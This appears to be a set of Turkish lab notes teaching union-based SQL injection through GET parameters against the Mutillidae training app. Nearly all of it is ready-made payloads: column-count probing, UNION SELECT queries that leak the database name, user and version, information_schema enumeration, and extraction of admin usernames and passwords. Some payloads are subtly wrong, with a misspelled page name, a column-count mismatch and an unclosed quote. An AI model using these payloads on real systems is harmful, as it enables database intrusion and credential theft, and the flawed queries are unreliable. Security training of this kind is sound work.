> # 1-SQL Get ile Veri Tabanı İsmini Öğrenme

#### 1. URL'kısmına ```123.123.123.123/mutillidae/index.php?page=user-inho.php&username=admin' order by1%23&password=123456&user-info-php-submit-button=View+Account+Details``` yazıyoruz
#### 2. ```order by 2``` diyerek tek tek deniyoruz ve kaç sütun olduğunu öğreniyoruz
#### 3. Kaç sütun olduğunu anlatıktan sonra (varsayalım 5 sütun var)
#### 4. ```123.123.123.123/mutillidae/index.php?page=user-inho.php&username=admin' union select 1, 2, 3, 4, 5%23&password=123456&user-info-php-submit-button=View+Account+Details``` yazarak o sütundaki değerleri bastırıyoruz
#### 5. ```123.123.123.123/mutillidae/index.php?page=user-inho.php&username=admin' union select 1, database(), user(), version(),5%23&password=123456&user-info-php-submit-button=View+Account+Details``` yazıyoruz
#### 6. Veritabanı ismini, kullanıcı adını ve linux versiyonunu öğreniyoruz
---
> # 2-SQL Get ile Veri Tabanındaki Table Name Bulma

#### 1. ```123.123.123.123/mutillidae/index.php?page=user-inho.php&username=admin' union select 1, table_name, null, null,5%23&password=123456&user-info-php-submit-button=View+Account+Details``` yazıyoruz
#### 2. Bu şekilde tüm table'lları görürüz (sadece owasp10 değil)
#### 3. Belirli bir veritabanındaki table'lları görmek için ```123.123.123.123/mutillidae/index.php?page=user-inho.php&username=admin' union select 1, table_name, null, null, null,5 from information_schema.tables where table_schema='<veritabanıadı>%23&password=123456&user-info-php-submit-button=View+Account+Details``` 
---
> # 3-SQL Get ile Veri Tabanındaki Sütun Name Bulma

#### 1. ```123.123.123.123/mutillidae/index.php?page=user-inho.php&username=admin' union select 1, column_name, null, null,5 from information_schema.columns where table_name='<tabloismi>'%23&password=123456&user-info-php-submit-button=View+Account+Details```
#### 2. Belirtilen tablodaki sütunları gösterir
---
> # 4-SQL Get ile Admin Bilgilerini Öğrenme

#### 1.```123.123.123.123/mutillidae/index.php?page=user-inho.php&username=admin' union select 1, username, password, is_admin,5 from account%23&password=123456&user-info-php-submit-button=View+Account+Details```
#### 2. Admin kullanıcı adlarını ve şifrelerini görürüz
